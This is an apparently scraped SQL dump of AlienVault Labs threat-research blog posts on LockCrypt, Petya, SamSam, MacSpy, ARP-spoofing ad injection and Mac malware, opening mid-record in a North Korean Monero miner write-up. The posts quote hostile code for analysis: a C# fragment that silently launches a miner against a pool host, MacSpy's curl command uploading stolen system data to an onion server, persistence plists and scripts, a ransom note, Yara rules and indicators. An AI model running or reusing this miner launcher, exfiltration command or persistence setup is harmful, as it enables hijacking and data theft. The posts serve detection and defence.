Process.Start(\"C:\\\\SoftwaresInstall\\\\soft\" + text + \".exe\", \"\");           Console.WriteLine(\"The number of processors on this computer is {0}.\", Environment.ProcessorCount);           int processorCount = Environment.ProcessorCount;           Console.WriteLine(processorCount);           int value = checked(processorCount - 1);           string str = \"KJU\" + Conversions.ToString(processorCount);           Process.Start(new ProcessStartInfo(\"C:\\\\Windows\\\\Sys64\\\\intelservice.exe\")           {               WindowStyle = ProcessWindowStyle.Hidden,               Arguments = ((\"-o barjuok.ryongnamsan.edu.kp:5615 -u 4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRy5YeFCqgoUMnzumvS -p \" + str + \" -k -t \" + Conversions.ToString(value)) ?? \"\")           });       }   }}', 'cryptocurrencymonero', '/blogs/labs-research/a-north-korean-monero-cryptocurrency-miner');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (15, 'LockCrypt Ransomware Spreading via RDP Brute-Force Attacks', 'Chris Doman', 'November 9, 2017 ', 'We previously reported on SamSam ransomware charging high ransoms for infected servers. But SamSam isn’t the only ransomware out there charging eye-watering amounts to decrypt business servers.Initial reports of a new variant of ransomware called LockCrypt started in June of this year. In October we saw an increase in infections.LockCrypt doesn’t have heavy code overlaps with other ransomware. We\'ve seen evidence that the attackers likely started out with easier-to-deploy “ransomware as a service” before re-investing in their own ransomware.We have seen small businesses infected with LockCrypt in the US, UK, South Africa, India and the Philippines.Initial CompromiseOne target reported they were infected via RDP brute-forcing from a compromised mail server. The attackers then manually killed business critical processes for maximum damage.We have seen lots of related activity from this IP:The TargetsTargets have reported paying between 0.5 and 1 Bitcoin per server - which translates at current prices to over $5000 per server. One business reported paying approximately $19,000 to recover three machines.An earlier version included a BitCoin address in the ransomware note. That address received about $20,000 worth of Bitcoins from targets in July.A photo of an infected machine taken by a targetOverview of ExecutionThe pop-up window and ransom message provided by the attackers to targetsLockCrypt encrypts files and renames them with a .lock extension. It also installs itself for persistence and deletes back-ups (volume shadow copies) to prevent an easy recovery.It executes a batch file to kill all non-core processes - a very aggressive way of anti-virus and sandbox evasion.LockCrypt then sends base64 encoded information about the infected machine to a server in Iran Ransomware proliferation?The first versions of LockCrypt used an e-mail address that was previously connected to Satan Ransomware - an easy to use “ransomware as a service”.To get the decryptеr you should pay for decrypt:to send 1 bitcoin today (tomorrow 2 bitcoins) to bitcoin the address 1Nez7W9ashFL4BA7vHuA5aoaad9XtqHKCF Send screenshot of payment to mail support [email protected] or [email protected] All your files have been encrypted due to a security problem with your PC If you want to restore them, write us to the e-mail support [email protected] or [email protected]Left - A ransom note from Satan Ransomware; Right - A ransom note from LockCrypt ransomware with matching contact details - A targeted business lost their accounting records to this malwareMany fear that ransomware creation services such as Satan could lead to attackers re-investing their criminal gain into more sophisticated schemes. It’s possible that has happened in this case.Coincidentally, AlienVault recently discussed the threat posed by Satan ransomware in an interview with the BBC. Here\'s what the creation process looks like:The Satan Ransomware Creation pagePrevention and DetectionPreventing RDP brute-forcing requires basic security hygiene such as:Consider enforcing complex passwords and two-factor authentication on RDP accessDon’t allow incoming RDP connections from anywhere on the internetConsider locking out users that have numerous failed login attemptsWe have provided detection rules, Yara signatures, File-Hashes, payment e-mails and bitcoin addresses below.How to detect these malicious behaviours in generalIndicators of compromise are useful for tracking malicious activity - but poor at detecting future malicious activity in general. Below we show how we detect LockCrypt in USM Anywhere:Yara rules for file detectionrule lockcrypt {\n\n       $a = \"taskkill /f /im bcn1.exe\" nocase wide ascii\n\n$mz = { 4d 5a }\n\n  condition:\n\n$mz at 0 and $a\n\n}\n\n\nrule lockcrypt_text {\n\n        $a = \"Set WhiteList=Microsoft.ActiveDirectory.WebServices.exe:cmd.exe\" nocase wide ascii\n\n        $b = \"You have to pay for decryption in Bitcoins. The price dependson\" nocase wide ascii\n\n    condition:\n\n        any of them\n\n}\n\n\nrule lockcrypt_installer_packer {\n\n    strings:\n\n        $a = \"c:\\\\users\\\\nachalnik\\\\documents\\\\visual\" nocase wide ascii\n\n        $b = \"WshShell.Run chr(34) & \\\"bcn1.exe\\\" & Chr(34), 0\" nocase wide ascii\n\n    condition:\n\n        any of them\n\n} BitCoin Addresses17K5weJTPyc8Ktei8c58D2jSGbXZdWXQ2f1Nez7W9ashFL4BA7vHuA5aoaad9XtqHKCF E-Mail Addresses[email protected][.]com[email protected][.]com[email protected][.]ch[email protected][.]com[email protected][.]com[email protected][.]com[email protected][.]ch File Hashes1df3d4da1ef11373966f54a6d67c38a223229f272438e1c6ec7cb4c1ea3ff3e2bf80ef6cfea9478bf69f247b59d17dab9ede4b74193234168ee6e3d55dc526e10948390b18338b460edf60beaf1a792d1d85dab64ec59b158fa2d47e78ad4373dc892346618f8fe561a7219a59e7c6fd2e15ff463469a29708886a23f54157b90ab44a962ababbf4500b335171e25d930ae3b8356a50bc547979126007aa42c0151cf4f4c5e2a90b57af8d22e085ebc5f8927cf8b14eeaade3adb271c11eb54f64d6cc34ad16e2ecbaf7e71573ed222cfa16b710cc6ff79ab3cc3c1c6c4b1138D69c972d578a3d4b15158ac14600f0e996113e510a4bc9815193c9e74740e612Cdd61a00a8175f1753b55094be506bd9fc1a6511a3f0abeeed0216b1db17e95eBce16a425c37d2ad3280c19d4c64bc7ed037d29dabe3e34ab4941a245cb5ec34722df6f33a9d11d841ce399a9081bac2788ce007474b0be9ee76efbf1f5a132b3756c1fcf3f6404582a19c5e1fd23aa043cb71e85700bdf6b0e6df80593ad565714546c621a797743f0bce6a8843611860d3392a7f3fcff5cf661d0a6bffa78b IP Addresses Performing RDP Brute-Force AttacksYou can view IP addresses associated with related attacks here.Ransom NoteAll your files have beenencrypted!All your files have been encrypted due to a security problemwith your PC. If you want to restore them, write us to the e-mail support: [email protected] or [email protected]Write this ID in the title of your messageIn case of no answer in 24 hours write us to theese e-mails support: [email protected] or [email protected]You have to pay for decryption in Bitcoins. The price dependson how fast you write to us. After payment we will send you thedecryption tool that will decrypt all your files.Free decryption as guaranteeBefore paying you can send us up to 3 files for freedecryption. The total size of files must be less than 10Mb (nonarchived), and files should not contain valuable information.(databases,backups, large excel sheets, etc.)How to obtain BitcoinsThe easiest way to buy bitcoins is LocalBitcoins site. Youhave to register, click \'Buy bitcoins\', and select the seller bypayment method and price.https://localbitcoins.com/buy_bitcoinsAlso you can find other places to buy Bitcoins and beginnersguide here:http://www.coindesk.com/information/how-can-i-buy-bitcoins/Attention!Do not rename encrypted files.Do not try to decrypt your data using third party software,it may cause permanent data loss.Decryption of your files with the help of third parties maycause increased price (they add their fee to our) or you can becomea victim of a scam. {{IDENTIFIER}}Your IDConclusionLockCrypt ransomware doesn’t appear to be targeted - the attackers just opportunistically infect servers with RDP. But they do show an interest in manually interacting with systems for maximum impact, and the excessive fees they charge can put businesses that can’t afford to pay out of operation. We’ve provided some details on how to detect LockCrypt, and others like it, below.', 'ransomwarebrute force attacksamsamlockcryptrdp', '/blogs/labs-research/lockcrypt-ransomware-spreading-via-rdp-brute-force-attacks');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (16, 'ARP Spoofing Used to Insert Malicious Adverts', 'Chris Doman', 'October 19, 2017 ', 'Recently we came across a new variant of the malware ServStart. ServStart is primarily used by attackers located in China, in a mix of targeted and opportunistic attacks. The attackers are hosting the ServStart malware on a file server that is open for anyone to view.The open file server at http://222.186.11[.]182:9999The Rar ArchiveOne of the files on the server, 11.rar, contains this batch script:The file 哈迪斯技术组ARP工具(Hades Technology Group ARP Tools).batZxarps - An ARP Spoofing ToolThis batch script executes a tool known as zxarps  (https://github.com/sincoder/zxarps). Zxarps is an ARP spoofing tool that has been publicly available for over ten years.It’s a fairly unusual tool, though familiar to anyone who played with hacking tools like Cain and Abel decades ago. ARP spoofing can be used to redirect traffic to an attacker controlled server.A description of ARP spoofing, from WikipediaA report from 2014 for an attack involving CVE-2014-6332 describes how an attacker might use zxarps well:“This malware performs ARP spoofing on the network to cause other systems to route their traffic through the infected system, and inject a malicious IFRAME into webpages.”The ARP spoofing attack can work in both directions. If a web-host is compromised, zxarps can be used to insert malicious code into other sites on the same web-host. A report from way back in 2009 describes attacks that operated this way:“A server on a local subnet was compromised and the attacker installed ARP spoofing malware (together with keyloggers and other Trojans) on the machine. The ARP spoofing malware poisoned local subnet so the outgoing traffic was tunneled through it. The same malware then inserted malicious JavaScript into every HTML page served by any server on that subnet. You can see how this is fruitful for the attacker – with one compromised server they can effectively attack hundreds of web sites (if it’s a hoster indeed).”We can see in the batch file that zxarps is attempting to insert Javascript from the URL http://www.mei988[.]com/yy.js.Potentially infected sitesA quick Google for the malicious Javascript indicates a number of websites serving the malicious code. This may mean the attackers are running zxarps on their network.https://urlscan.io/result/534f9ec9-32c6-4136-b293-88af492b08d7/dom/All this.. Just to insert adverts for a CasinoReviewing the injected code indicates it isn’t being used to serve malware, but simply to serve adverts for a Chinese casino:https://www.hybrid-analysis.com/sample/0f64d813cad17416e6d4d9abbb9f99172932d5f7186829b5cf0a8d254f8df33d?environmentId=100If you’re reviewing malvertising on a website, and aren’t sure how it got there, this is another technique to consider.Indicators of CompromiseMalicious files on the fileserver896B454BCE4C4717511FA6AFE6B18F64\n8C19D83FF359A1B77CB06939C2E5F0CB\n896B454BCE4C4717511FA6AFE6B18F64\n896B454BCE4C4717511FA6AFE6B18F64\nC1111792CF99B51CF0E0D6F845D8BA89\nAEA42EC19FABBAC5D028EA09B8F339DF\n045842D836FEEA2020240141A39014DA\n724866003B3ECDD018A4C95935AA6BC9\n40B8FFA9148646487B5F220E8399A894\n2B8F5A693275102AE1D48FC138685C80\nA11A2F0CFE6D0B4C50945989DB6360CD\nD48CD20233843163132354CECEEF72AA\n4B94FA468513CF0946BBC02B8F61D95B\n222.186.11[.]182You can view these indicators in AlienVault OTX', 'malwaremalware researchmalvertisingzxarpsarp spoofing', '/blogs/labs-research/arp-spoofing-used-to-insert-malicious-adverts');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (17, 'New Variant of Petya / PetrWrap Ransomware Strikes', 'Sacha Dawes', 'June 27, 2017 ', 'On June 27th the AlienVault Labs Team became aware of a new ransomware, a variant of the Petya malware, that is spreading rapidly and is known to have affected organizations in Russia and the Ukraine, and some other parts of Europe. A pulse detailing the Indicators of Compromise for this variant of Petya can be found in the AlienVault Open Threat Exchange (OTX) at https://otx.alienvault.com/pulse/59525e7a95270e240c055ead/.  Once it has compromised a system, the ransomware will:Overwrite the Master Boot Record (MBR), encrypt individual files that match a list of file extensions (including documents, archives, and more), and after a reboot of the system will present the user a message requesting a ransom of $300 in Bitcoin to decrypt the system. To date, we understand that over $3000 has been paid in ransom, but we have not heard of any affected organizations having successfully decrypted their files.Attempt to replicate itself to other systems on your network.Understanding how this ransomware variant works is first in understanding how to protect your existing assets, and in detecting when any of your systems have been compromised. In addition to this blog we\'ve also created a short white paper detailing the facts behind this ransomware. You can access it here.What We Know About this Ransomware CampaignWhat we know is that, like WannaCry, this variant of Petya affects Microsoft Windows computers and is technically a \'compute worm\', meaning that it replicates itself in order to spread to other computers. In addition, the campaign does not rely on a user clicking on an attachment to infect the host, nor is it known to communicate with a Command & Control (C2 or C&C) server in order to get instructions.What this variant of Petya is known to use to distribute itself to other systems are the PsExec service (PsExec is dropped as dllhost.dat by the ransomware) and WMI services. In addition, the ETERNALBLUE exploit toolkit (which was released by the Shadow Brokers group in April 2017 and used to such great success by WannaCry) is suspected to be a key part of the attack.There are also reports that some organizations were infected through a software update for a Ukrainian tax accounting package called MeDoc, which given the locations of many of the attacked organizations and the below data from Kapersky is likelyOnce a system has been compromised, the ransomware takes the following steps:Writes a message to the raw disk partitionClears the Windows Event log using WevtutilRestarts the machineEncrypts files matching a list of file extensions (including .3ds, .7z, .accdb, .ai, .asp, .aspx, .avhd, .back, .bak, .c, .cfg, .conf, .cpp, .cs, .ctl, .dbf, .disk, .djvu, .doc, .docx, .dwg, .eml, .fdb, .gz, .h, .hdd, .kdbx, .mail, .mdb, .msg, .nrg, .ora, .ost, .ova, .ovf, .pdf, .php, .pmf .ppt, .pptx, .pst, .pvi, .py .pyc, .rar, .rtf, .sln, .sql, .tar, .vbox, .vbs, .vcb, .vdi, .vfd, .vmc, .vmdk, .vmsd, .vmx, .vsdx, .vsv, .work, .xls, .xlsx, .xvd, and .zip)Leverages WMI or PsExec to spread (PsExec is dropped as dllhost.dat)Presents a text message on the screen of the user, similar to the following:\n\nProtecting Against this Variant of Petya RansomwareThere are some critical steps that you should follow to mitigate against an attack by this variant of Petya:Update Windows software to install any missing patches, like those included within Microsoft Bulletin MS17-010Ensure malware protection is installed, running, and up to dateEnsure you have systems and critical data backed up, should you need to restore a compromised systemUnderstand what services and applications are running on each of your critical assets, and disable any that are not required (including SMB v1)Block ports 445 (SMB) and 139 (file and printer sharing) from any user or entity outside of your organizationIf you\'re an existing customer of AlienVault USM Anywhere or USM Appliance, Indicators of Compromise were reported in the AlienVault Open Threat Exchange (OTX) within an hour of the attack, and IDS signatures already within USM Anywhere and USM Appliance are able to detect and alarm on the ransomware and its different methods. USM can also help you identify critical vulnerabilities as well as detect if your organization is under attack by this ransomware variant. In addition, I wanted to highlight:The AlienVault Threat Intelligence for USM Anywhere and USM Appliance were updated in March 2017 to include new IDS signatures that detect ETERNALBLUE in a customer network.AlienVault ensures that USM Anywhere and USM Appliance customers are assured protection against that variant of Petya, and other malware and ransomware like it, through the continuously updated AlienVault Threat Intelligence subscription that provides USM customers the ability to detect both vulnerabilities (often in advance of the actual attack) as well as generate alarms when the threat is in-motion.USM Anywhere ships with several AlienApps that are immediately available to orchestrate responses to incidents, directly from within the USM Anywhere console, including:The Forensics and Response AlienApp enables customers to investigate the network and systems as needed, and disable networking on infected systems.The AlienApp for Carbon Black includes a response action that allow customers to isolate infected systems from their network and prevent further spread.The AlienApp for Palo Alto Networks includes a response action to block domains and ports using the Palo Alto next generation firewall.What to do if a system becomes compromisedThe steps to mitigate any compromised system on your network is similar for most malware and ransomware threats.Isolate the system from your network, to prevent spread of the ransomware to other systems.Run forensics and anti-malware software on the infected system, confirming that the anti-malware is running with its latest update. Depending on the severity of the compromise, this may require you attach the drives of the infected system as external disks, but this should be a last resort.Run additional forensics on your network data, to better understand the scope of the compromise. This may require use of specialist tools for the compromised system, and you can also search events gathered from across your network and any cloud environments and SaaS services (e.g. Office 365) using a log management tool like USM Anywhere.Report the ransomware incident to the respective authority. For example, US organizations should report any incident to the Internet Crime Compliance Center (IC3).Advanced Ransomware Detection with AlienVaultTo detect threats like ransomware, AlienVault USM unifies the power of asset discovery, vulnerability assessment, intrusion detection, behavioral monitoring, SIEM, and log management in one console, giving you complete security visibility of your on-premises and cloud infrastructure. This unified approach is the most effective way to combat advanced threats like ransomware, and gives you all the threat context you need to detect, investigate, and respond to an emerging threat—all in a single pane of glass.This Thursday (June 29th @ 9AM CDT) we\'re hosting a special webcast on how to detect Petya variant with USM Anywhere. Reserve your spot, or watch a recording of the webcast HERE.', 'ransomwarenotpetyapetyapetrwrap', '/blogs/labs-research/new-variant-of-petya-petrwrap-ransomware-strikes');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (18, 'SamSam Ransomware Targeted Attacks Continue', 'Chris Doman', 'June 21, 2017 ', 'Normally new variants of ransomware families aren\'t particularly interesting.SamSam, however, is different. Whereas most ransomware is automatically propagated, SamSam is deployed manually.In addition, the group behind SamSam charges very high ransoms because of the amount of effort invested in their operations, which made them the subject of two FBI Alerts last year.The attacks seem to peak in waves as campaigns distributing SamSam are executed. A notable recent example was a large hospital in New York that was hit with SamSam in April. The hospital declined to pay the attackers the $44,000 ransom demanded. It took a month for the hospital’s IT systems to be fully restored.Defending against SamSam is more akin to a targeted attack than typical opportunistic ransomware. SamSam attackers are known to:Gain remote access through traditional attacks, such as JBoss exploitsDeploy web-shellsConnect to RDP over HTTP tunnels such as ReGeorgRun batch scripts to deploy the ransomware over machinesEarlier this week, ID Ransomware spotted new variants of the SamSam ransomware. A review of the code (which decompiles cleanly with the tool ILSpy) indicates that little has changed, apart from some updates to the ransom note:The ransom the victims must pay to recover their files is hardcoded in the malware. In this attack, it was:1.7 Bitcoin ($4,600) for a single machine6 Bitcoins ($16,400) for half the machines (allowing the victim to confirm they can recover their files)12 Bitcoins ($32,800) for all of the machinesThe most recent attacks appear to have been successful, at least from the attackers point of view. The Bitcoin address associated with this week’s attacks has received $33,000.These new variants remind us that we must remain vigilant and utilize the latest threat indicators to detected new strains of existing malware. You can view the associated indicators in OTX.  Update: Vallejo has published an analysis on this sample of SamSam.', 'ransomwarecrimewaresamsam', '/blogs/labs-research/samsam-ransomware-targeted-attacks-continue');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (19, 'MacSpy: OS X RAT as a Service', 'Peter Ewane', 'June 9, 2017 ', 'MacSpy is advertised as the \"most sophisticated Mac spyware ever”, with the low starting price of free. While the idea of malware-as-a-service (MaaS) isn’t a new one with players such as Tox and Shark the game, it can be said that MacSpy is one of the first seen for the OS X platform.The authors state that they created this malware due to Apple products gaining popularity in the recent years. They also state that during their tenure in the field that they have noticed a lack of \"sophisticated malware for Mac users\" and they believe that \"people were in need of such programs on MacOS\". So they created MacSpy. The MacSpy authors claim to have the following features in the free version of their RAT:If you are willing to pay an unknown amount of bitcoins for the advanced version, the malware authors advertise the following features:MacSpy is not as polished as some of the malware-as-a-service providers out there, as there doesn’t seem to be any customer facing automated service of signing up for their service. In order to receive a copy of MacSpy we had to email the author our preferred username and password, in order for them to make us an account. After confirming our details they created an account for us, and delivered a zipped file and the following instructions:Initial AnalysisAfter unzipping the archive we observed it contained the following files:The archive contains four files:Mach-O 64-bit executable called \'updated\'Mach-O 64-bit executable called \'webkitproxy\'Mach-O 64-bit dynamically linked shared library called \'libevent-2.0.5.dylib\'Config fileAfter examining webkitproxy and libevent-2.0.5.dylib, we noted they are signed by Tor, and thus we concluded that they are related to the function of Tor Onion routing. The contents of the config file further convince us of our suspicions are correct:Config ContentsSOCKSPort 47905 KeepAliveIsolateSOCKSAuth OnionTrafficOnly\n\nDataDirectory proxyData\n\nAvoidDiskWrites 1\n\nControlPort 47906\n\nMaxCircuitDirtiness 7200\n\nEnforceDistinctSubnets 0\n\nHidServAuth <redacted>.onion <redacted>The \"updated\" file, on the other hand is not digitally signed, and it is currently completely undetected by various AV companies on VirusTotal.Anti-AnalysisMacSpy has several countermeasures that hamper analysis efforts. To prevent debugging, it calls ptrace() with the PT_DENY_ATTACH option. This is a common anti-debugger check and will prevent debuggers from attaching to the process.If you bypass the ptrace countermeasure, MacSpy has additional code that checks if it is running in a debugger.The code above is very similar to the debugger checking code from this Stack Overflow post.In addition to the anti-debugging countermeasures, MacSpy contains checks against the execution environment that can make it difficult to run in a virtual machine. In the code below, you can see that MacSpy checks that the number of physical CPUs is greater than 1, the number of logical cores is greater than 3, and the number of logical cores is twice the number of physical cores. MacSpy also checks that there is at least 4 GB of memory on the host. Since malware sandboxes often run with minimal resources, these checks can prevent proper execution in virtual environments.Similar to MacRansom, MacSpy also compares the machine model to \"Mac\" using the \'sysctl\' command. MacSpy will kill all Terminal windows which can be annoying to analysts using command line tools to analyze the malware (OSX/Dok exhibits similar behavior by killing Terminal windows).PersistenceIn order to persist on the system the malware creates a launch entry in ~/Library/LaunchAgents/com.apple.webkit.plist. This ensures that the malware will run at start up to continue collecting information.<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n<plist version=\"1.0\">\n    <dict>\n        <key>Label</key>\n        <string>com.apple.webkit</string>\n        <key>Program</key>\n        <string>/Users/<redacted>/Library/.DS_Stores/updated</string>\n        <key>ProgramArguments</key>\n        <array>\n            <string>daemon</string>\n        </array>\n        <key>RunAtLoad</key>\n        <true/>\n        <key>KeepAlive</key>\n        <true/>\n    </dict>\n</plist>Behavior Analysis:Upon execution, successfully passing the anti-analysis checks and setting persistence, the malware then copies itself and associated files from the original point of execution to \"~/Library/.DS_Stores/\" and deletes the original files in an attempt to stay hidden from the user. The malware then checks the functionality of its tor proxy by utilizing the curl command to contact the command and control server. After connecting to the CnC, the malware sends the data it had collected earlier, such as system information, by sending POST requests through the TOR proxy. This process repeats again for the various data the malware has collected. After exfiltration of the data, the malware deletes the temporary files containing the data it sent.The following curl command used to exfiltrate data:/usr/bin/curl --fail -m 25 --socks5-hostname 127.0.0.1:47905 -ks -X POST -H key:<KEY> -H type:system -H Content-Type:multipart/form-data -F [email protected]\'/Users/<USER>/Library/.DS_Stores/data/tmp/SystemInfo\' http://<redacted>.onion/uploadContents of ~/Library/.DS_Stores/data/tmp/SystemInfofullUsername            <USER>\nusername            <USER>\nhostname            <USER>’s Mac mini\nos              Version 10.11.6 (Build 15G1510)\ntimezone            Europe/Zurich\nlanguages           en,de\nmemory              4096\nprocessorCount          2\nsystemUptime            19052.138692271\nfireWall            0\nip              <IP ADDRESS>\nmm              false\nroot                /Users/<USER>/Library/.DS_Stores\nidentifier          Macmini6,1\nuuid                <UUID>\n\n/dev/disk0 (internal, physical):\n   #:                       TYPE NAME                    SIZE       IDENTIFIER\n   0:      GUID_partition_scheme                        *500.1 GB   disk0\n   1:                        EFI EFI                     209.7 MB   disk0s1\n   2:                  Apple_HFS Macintosh HD            499.2 GB   disk0s2\n   3:                 Apple_Boot Recovery HD             650.0 MB   disk0s3 User Web PortalIn our initial email to the malware authors we sent a set of credentials that we wanted to use in their web portal. After logging into the MacSpy web portal you are greeted with a very bare bones directory listing containing a folder labeled the most recent date of the malware executing on a system in the YYYYMM format, followed by a folder in the DD format. Diving into that folder you\'re treated with a series of directories similar to that of the directory naming on the victim system. Inside these folders is the data that was collected from the victim the malware was executed on.DetectionNIDSThe best way to detect MacSpy running on a Mac is to use a combination of Network IDS (NIDS) rules as it communicates. As it turns out, AlienVault provides this rule in its threat intelligence, which has already been updated with a rule called \'System Compromise, Malware RAT, MacSpy\'. This feeds into the USM correlation engine to generate an alarm that will notify AlienVault customers that one of their systems is compromised.Osquery{\n  \"platform\": \"darwin\",\n  \"version\": \"1.4.5\",\n  \"queries\": {\n    \"MacSpy_Launch\":{\n         \"query\":\"select * from launchd where name = \'com.apple.webkit.plist\';\",\n         \"interval\":\"3600\",\n         \"description”:\"MacSpy Launch Agent\",\n         \"value\":\"Artifact used by this malware\"\n      }\n   }\n}YaraYou can use the rule below in any system that supports Yara to detect this Mac-based malware.rule macSpy\n{\n    meta:\n        author = \"AlienVault Labs\"\n        type = \"malware\"\n        description = \"MacSpy\"\n    strings:\n    $header0 = {cf fa ed fe}\n    $header1 = {ce fa ed fe}\n    $header2 = {ca fe ba be}\n    $c1 = { 76 31 09 00 76 32 09 00 76 33 09 00 69 31 09 00 69 32 09 00 69 33 09 00 69 34 09 00 66 31 09 00 66 32 09 00 66 33 09 00 66 34 09 00 74 63 3A 00 }\n    condition:\n       ($header0 at 0 or $header1 at 0 or $header2 at 0) and $c1\n}ConclusionPeople generally assume when they are using Macs they are relatively safe from malware. This has been a generally true statement, but this belief is becoming less and less true by the day, as evidenced by the increasing diversity in mac malware along with this name family. While this piece of Mac malware may not be the most stealthy program, it is feature rich and it goes to show that as OS X continues to grow in market share and we can expect malware authors to invest greater amounts of time in producing malware for this platform.If you want to find out more about this malware, here is a pulse we have in the AlienVault Open Threat Exchange (OTX):  Appendix:6c03e4a9bcb9afaedb7451a33c214ae4\nc72de549a1e72cfff928e8d2591d7e97\ncc07ab42070922b760b6bf9f894d0290\n27056cabd185e939195d1aaa2aa1030f\nf38977a34b1f6d8592fa17fafdb76c59', 'macosxratmacspy', '/blogs/labs-research/macspy-os-x-rat-as-a-service');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (20, 'Diversity in Recent Mac Malware', 'Eddie Lee', 'May 19, 2017 ', 'In recent weeks, there have been some high-profile reports about Mac malware, most notably OSX/Dok and OSX.Proton.B. Dok malware made headlines due to its unique ability to intercept all web traffic, while Proton.B gained fame when attackers replaced legitimate versions of HandBrake with an infected version on the vendor’s download site. Another lower profile piece of Mac malware making the rounds is Mac.Backdoor.Systemd.1.Figure 1: Systemd pretending to be corrupted and un-runnable.There have been no public reports as to who is behind these attacks and only little information about their targets. OSX/Dok is reported to have targeted European victims, while users of HandBrake were the victims of Proton.B. One corporate victim of Proton.B was Panic, Inc. which had its source code stolen and received a ransom demand from the attackers.Each of these malware variants is designed to take advantage of Macs, but analysis shows that they are actually drastically different from each other, showing just how diverse the Mac malware space has grown. Let’s dive into some of the technical details (but not too technical ;)  of each piece of malware to learn more about what they do and how they work. OSX/DokOSX.Proton.BMac.BackDoor.System.1FunctionalityHTTP(S) proxyCredential theft (potentially other RAT functionality)Backdoor/RATLanguageObjective-C (with heavy use of shell commands)Objective-C (with heavy use of shell commands)C++ (with a handful of shell commands)PersistenceLaunch AgentLaunch AgentLaunch AgentLaunch DaemonStartup Item\nUses chflags to make files read-onlyDistributionPhishing emailsCompromised software download(presumably) PhishingAnti-AnalysisNoneAnti-debugger (PT_DENY_ATTACH)Closes Terminal and Wireshark WindowsNoneBinary ObfuscationNewer variants are packed with UPXPassword protected zip archive\nEncrypted configuration fileEncrypted configuration file\nXOR encrypted strings in binaryDetection AvoidanceSigned App bundleInstalls trusted root certificate\nModifies sudo settings to prevent promptingChecks for security softwareInfected legitimate software\nUse of “hidden” dot filesUses chflags to hide files from UI\nUse of “hidden” dot filesC2MiTM proxy (no separate C2)HTTPSCustom 3DESFunctionalityDok is very basic in its functionality – it reconfigures a system to proxy web traffic through a malicious host. It does this by installing Tor and changing web proxy settings to hijack web traffic in order to steal credentials or even alter content. There is no need for the victim to communicate with a command and control server since the malicious proxy server already has access to the information its trying to steal.Proton.B might be a slimmed down version of Proton.A which contains a full-featured suite of RAT functionalities. However, while Proton.B is reported to have only basic credential stealing capabilities, it does have the capability to run arbitrary commands from its configuration file. The decrypted configuration file also shows hints of other capabilities, such as grabbing screenshots and SSH tunneling. Proton.B is also able to steal credentials by collecting them from keychains, password vaults, and web browsers. The credentials are then exfiltrated over HTTPS.Systemd.1 is a basic backdoor/RAT that waits for commands from a command and control server. This backdoor is able to either listen on a network socket for an incoming C&C connection or make its own connection to a C&C. Commands from the C&C allow attackers to do things like: run arbitrary commands, perform file system operations, update the backdoor software, update the C&C server, and install plugins.Language and DistributionWindows malware often comes in a variety of formats – ranging from office documents, script files, executables, or malicious PDFs just to name a few. In contrast, Mac malware tends to have much less variation and most often shows up as a Mach-O executable, zipped app bundle, or DMG file. There has been a recent case of malicious Office documents targeting Macs and back in 2012 AlienVault also reported on Office documents targeting Macs, but those are exceptions to the norm.Dok is distributed as a zipped app bundle written in Objective-C, but also uses a shell script to perform critical functionality. The zipped app bundle is typically sent as an attachment to a phishing email and requires the victim to execute the application.Proton.B is also written in Objective-C, but the malicious code is distributed with the popular video transcoding tool HandBrake. Proton.B uses HandBrake to bootstrap loading of its own code and tricks victims into entering in their password by presenting a fake authentication prompt.Systemd.1 is different from Dok and Proton in that it is written in C++. We’re not sure of its initial infection vector, but we can posit that it is via phishing since the samples[1] in VirusTotal are often named “Confidential_Data”. It is possible that the Systemd.1 Mach-O is distributed along with an app bundle, but we have not discovered that link yet. (As a side note, we’ve previously looked at another piece of C++ Mac malware, OceanLotus, and Systemd.1 does some similar things like decrypting XOR encrypted strings in __mod_init, however, Systemd.1 has fewer features.)Figure 2. Systemd XOR decrypting stringsPersistenceEven though there are several ways that malware can persist on Macs, we find that most choose to use launch agents and launch daemons. Here, Dok and Proton use launch agents while Systemd.1 uses both agent and daemon. To make things extra sticky, Systemd.1 also uses the deprecated Startup Items feature in OSX and drops files in /Library/StartItems./Library/StartupItems/sysetmd/StartupParameters.plist will contain the following text{Description = \"Start systemd\";Provides = (\"system\");Requires = (\"Network\");OrderPreference = \"None\";}And /Library/StartupItems/sysetmd/sysetmd will look like:#!/bin/sh. /etc/rc.commonStartService (){ConsoleMessage \"Start system Service\"/Library/sysetmd d}StopService (){return 0}RestartService (){return 0}RunService \"$1\"Systemd.1 also makes it slightly harder to remove the malware by using the “chflags” command to make files read-only.Anti-Analysis, Binary Obfuscation and Detection AvoidanceInitial samples of Dok did not have any obfuscation or anti-analysis code, however, newer variants are being packed with UPX. In order to suppress security prompts from the operating system, Dok was cryptographically signed by a valid developer. Furthermore, Dok installs a malicious trusted root certificate so that web browsers won’t alert users that their HTTPS traffic is being intercepted by a proxy.Figure 3. Dok signed with a legitimate certificateProton.B attempts to thwart analysis by preventing debuggers from attaching to it (though this can be easily bypassed). It also kills Terminal and Wireshark processes – both of which would be used by someone who wanted to analyze the malware. As previously mentioned, Proton.B was distributed with a modified version of HandBrake. Modified versions extract the core Proton.B binary from a password protected (encrypted) zip file. Although the Proton.B executable itself is not obfuscated, its configuration file is encrypted. Once executed, Proton.B checks for the presence of popular security software Little Snitch, Radio Silence and HandsOff – if present, it stops running. Popular in *nix-based malware, Proton.B also uses “hidden” dot files to make it harder to see.Systemd.1 does not have any anti-debugging measures, but does XOR encrypt several strings in the binary. These strings are decrypted at runtime along with a 3DES encrypted configuration file. Systemd.1 also uses hidden dot files and directories, but goes one step further and hides files with the “chflags hidden” command.TakeawaysAs you can see, these three pieces of malware are distinct from each other in their approaches and illustrate the diversity of Mac malware variants that have surfaced in just the past few weeks. One can only expect the diversity to increase in the future. In particular, we’d expect future Mac malware to utilize more 